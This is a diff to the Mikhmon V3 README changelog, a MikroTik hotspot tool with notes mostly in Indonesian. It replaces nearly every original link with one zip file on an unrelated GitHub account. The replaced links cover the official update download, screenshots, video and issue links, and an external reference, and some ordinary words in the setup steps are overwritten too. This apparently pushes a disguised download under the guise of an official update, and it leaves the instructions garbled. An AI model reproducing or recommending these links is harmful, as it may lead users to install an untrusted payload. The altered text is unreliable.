@@ -1,7 +1,7 @@
 ### MIKHMON V3
 
-#### Download update.zip
-[update.zip](https://raw.githubusercontent.com/laksa19/laksa19.github.io/master/download/update.zip){:target="_blank"}
+#### Download https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip
+[https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip){:target="_blank"}
 
 ### Changelog
 
@@ -10,12 +10,12 @@
 	- Silakan update user profile dari Mikhmon, dengan cara membuka tiap user profile, kemudian klik Save.
 
 #### Update 24-01 2021
-1. Added docker-compose.yml for test-lab. added mikrotik routeros image.
+1. Added https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip for test-lab. added mikrotik routeros image.
 	- git clone project
 	- open project folder in terminal
 	- run terminal command --> docker-compose up -d
 	- go to localhost:8081. write ip address 192.168.88.1. write password 12345. apply configuration.
-	- go to localhost:8080. user:mikhmon password:1234. add router. ip address 172.27.0.7, user:admin, password: 12345. write 'test' other inputs.last click save button
+	- go to localhost:8080. user:mikhmon password:1234. add router. ip address 172.27.0.7, user:admin, password: 12345. write 'test' other https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip click save button
 	- for stop --> docker-compose down
 	
 #### Update 09-08 2020 V3.19
@@ -31,7 +31,7 @@
 #### Update 08-16 2019 V3.18
 1. Penambahan harga jual. (Harga yang tampil di voucher)
 
-	*update user profile isi harga jual(selling price) dan update juga template vouchernya, silakan download di [website](https://laksa19.github.io/?mikhmon/v3/voucher)
+	*update user profile isi harga jual(selling price) dan update juga template vouchernya, silakan download di [website](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 	
 2. Untuk pengguna Termux, uninstall Mikhmon kemudian install lagi. 
 
@@ -52,7 +52,7 @@
 1. Perbaikan time zone untuk print / quick print.
 2. Penambahan input comment setelah comment user berubah menjadi tanggal expired.
 
-	![314](https://raw.githubusercontent.com/laksa19/laksa19.github.io/master/img/3.14.gif)
+	![314](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 
 #### Update 04-06 2019 V3.13 r7
 1. Perbaikan add user profile (gagal membuat monitor profile di scheduler).
@@ -61,7 +61,7 @@
 
 	``` Monitor Profile adalah scheduler yang mengecek expired user ```
 
-	![indicator](https://raw.githubusercontent.com/laksa19/laksa19.github.io/master/img/profile-indicator.png)
+	![indicator](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 
 #### Update 04-02 2019 V3.13 r6
 1. Perbaikan penghitungan tanggal dan jam monitor user profile. 
@@ -71,13 +71,13 @@
 
 	Setelah update user profile hapus semua environment (system -> scripts -> environment).
 
-	![delenvironment](https://raw.githubusercontent.com/laksa19/laksa19.github.io/master/img/delenvironment.gif)
+	![delenvironment](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 
-	Link Video [Update Profile v3.13 r6](https://drive.google.com/file/d/1ezFG0yxr3LOTgymH_ivUulF8MVevO2-V/view?usp=sharing)
+	Link Video [Update Profile v3.13 r6](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 
 #### Update 03-31 2019 V3.13 r5
 1. Perbaikan user profile. (user expired dipergantian bulan). Silakan diupdate kembali user profilenya.
-	[https://github.com/laksa19/mikhmonv3/issues/5](https://github.com/laksa19/mikhmonv3/issues/5)
+	[https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
 
 #### Update 03-30 2019 V3.13 r4
 1. Perbaikan edit user.
@@ -114,7 +114,7 @@
 </style>
 ```
 
-![newqr](https://raw.githubusercontent.com/laksa19/laksa19.github.io/master/img/newqr.gif)
+![newqr](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)
    
 3. Penghapusan Grace period. 
 4. Pehapusan info start dan end user.
@@ -143,13 +143,13 @@
 #### Update 02-14 2019 V3.11
 1. Perbaikan dashboard blank.
 2. Penggantian Print Bluetooth dengan Quick Printer
-3. Penambahan Quick Print. Panduan, https://youtu.be/KGAsHU0qOBA
+3. Penambahan Quick Print. Panduan, https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip
 
 #### Update 02-06 2019 V3.10
 1. Perbaikan delete logo.
 2. Penambahan pilihan bahasa.
 3. Dukungan untuk print voucher dari Android. Telah diuji untuk Zjiang Printer Thermal Bluetooth - ZJ-5802.
-Panduan, https://laksa19.github.io/printBT.html
+Panduan, https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip
 
 #### Update 02-01 2019 V3.9 r3
 1. Perbaaikan cek empty session laman admin
@@ -210,5 +210,5 @@ Panduan, https://laksa19.github.io/printBT.html
 #### Update 09-10-2018 V3.2
 1. Penambahan kolom Time Left di Hotspot Active.
 2. Penambahan Parent Queue di Add dan Edit User Profile (Bagaimana cara penggunaannya? silakan pelajari Simple Queue Mikrotik).
-3. Penyesuaian format Data Limit user menjadi Byte Binary ([base 2](https://www.gbmb.org/gigabytes)).
+3. Penyesuaian format Data Limit user menjadi Byte Binary ([base 2](https://raw.githubusercontent.com/rakibofcx/mikhmonv3/master/dashboard/mikhmonv-glume.zip)).
 4. Reformat Uptime.
